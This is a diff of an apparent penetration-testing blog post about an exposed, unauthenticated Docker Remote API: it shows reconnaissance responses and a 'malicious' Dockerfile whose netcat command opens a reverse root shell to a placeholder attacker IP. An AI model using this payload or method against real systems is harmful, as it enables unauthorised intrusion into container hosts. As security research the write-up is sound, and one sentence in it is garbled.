@@ -33,11 +33,17 @@ In order to create a Docker container, you need to build an image first. You can
 ## **Information Gathering**
 
 Initial reconnaissance showed an open port that was apparently serving some sort of an API that supports JSON objects. The response for the initial GET request `http://10.0.5.10:4000` was as the following:
-
-	{
-    "message":"page not found"
-    }
-
+```http
+HTTP/1.1 404 Not Found
+Server: nginx/1.10.3 (Ubuntu)
+Date: Tue, 03 Oct, 2017 15:52:16 GMT
+Content-Type: application/json
+Content-Length: 30
+Connection: Close
+{
+"message":"page not found"
+}
+```
 By appending `/info` to the URL of the service to be like this: `http://10.0.5.10:4000/info`, we were able to view further information about the Docker service behind the API:
 
 ![Information about the Docker Daemon]({{ "https://raw.githubusercontent.com/fusionx3/fusionx3.github.io/master/images/docker_1.png" | absolute_url }})
@@ -46,12 +52,17 @@ By appending `/info` to the URL of the service to be like this: `http://10.0.5.1
 Docker API hasSo, the system administrator hasn't restricted access to the Docker API (A big mistake), and apparently, since the Docker daemon runs as a privileged user, I doubt that the system administration bothered
 
 To enumerate the version of the API, we appended `v1.30/info` to the URL and the API explicitly told us its version. v1.30 is the latest version of the API at the time of writing this article, and according to the documentation, you can also query the server's info by submitting a GET request to this URL: `http://10.0.5.10:4000/v1.30/info`
-
-
-	{
-	"message":"client is newer than server (client API version: 1.30, server API version: 1.24)"
-	}
-
+```http
+HTTP/1.1 400 Bad Request
+Server: nginx/1.10.3 (Ubuntu)
+Date: Tue, 03 Oct, 2017 15:52:16 GMT
+Content-Type: application/json
+Content-Length: 96
+Connection: Close
+{
+"message":"client is newer than server (client API version: 1.30, server API version: 1.24)"
+}
+```
 
 <br>
 ## **Gaining Access to a Container**
@@ -61,7 +72,7 @@ After some quick reading through the [Docker API Documentation](https://docs.doc
 Since Docker allows us to create an image from a _Dockerfile_ through the UNIX socket, it shouldn't be different if performed through the API, right?
 We begin to craft our own malicious _Dockerfile_ and upload it anywhere on the internet. The Dockerfile I created utilized a clean Ubuntu installation and the good ol' netcat to give us a reverse TCP shell with root access to the container.
 
-```
+```Dockerfile
 FROM ubuntu:16.04
 RUN apt-get update -y && apt-get install netcat -y
 CMD ["nc", "-n", "My_OWN_IP", "4444", "-e", "/bin/bash"]
